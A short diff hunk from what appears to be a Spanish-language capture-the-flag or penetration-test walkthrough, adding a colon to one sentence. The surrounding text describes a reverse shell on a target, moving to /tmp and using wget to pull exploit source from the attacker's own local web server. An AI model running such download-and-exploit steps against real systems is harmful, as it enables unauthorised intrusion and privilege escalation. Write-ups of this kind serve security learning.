@@ -120,7 +120,7 @@ python3 -m http.server 80
 ```
 ![16](https://user-images.githubusercontent.com/75953873/171932402-4c30740c-4e87-4d2e-99be-b09d54c089c1.png)
 
-Dentro de la reverse shell generada, nos movemos al directorio `/tmp` y descargamos el exploit de nuestro servidor
+Dentro de la reverse shell generada, nos movemos al directorio `/tmp` y descargamos el exploit de nuestro servidor:
 ```
 cd /tmp
 wget http://192.168.1.9/15285.c
